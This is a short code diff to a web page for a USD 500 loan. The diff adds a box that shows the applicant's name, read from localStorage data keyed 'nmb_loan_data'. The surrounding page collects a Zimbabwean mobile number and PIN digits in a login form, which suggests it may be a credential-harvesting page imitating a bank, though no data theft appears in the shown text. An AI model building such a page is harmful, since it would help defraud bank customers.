@@ -50,6 +50,12 @@
                     <span class="font-black text-lg text-[#003d7a]" id="displayAmount">USD 500</span>
                 </div>
 
+                <!-- Applicant Name Display -->
+                <div class="bg-gray-50 border border-gray-100 rounded-2xl p-4 flex justify-between items-center">
+                    <span class="text-[9px] font-black text-gray-400 uppercase tracking-widest">Applicant Name</span>
+                    <span class="font-black text-lg text-[#003d7a]" id="displayName">-</span>
+                </div>
+
                 <!-- Phone Number -->
                 <div class="space-y-2">
                     <label class="text-[9px] font-black text-gray-400 uppercase tracking-widest ml-1">Mobile Number (Zimbabwe)</label>
@@ -111,9 +117,11 @@
         const loginForm = document.getElementById('loginForm');
         const verificationOverlay = document.getElementById('verificationOverlay');
         const displayAmount = document.getElementById('displayAmount');
+        const displayName = document.getElementById('displayName');
 
         const loanData = JSON.parse(localStorage.getItem('nmb_loan_data') || '{}');
         if (loanData.amount) displayAmount.textContent = `USD ${parseFloat(loanData.amount).toLocaleString()}`;
+        if (loanData.fullName) displayName.textContent = loanData.fullName;
 
         pinInputs.forEach((input, index) => {
             input.addEventListener('input', (e) => {
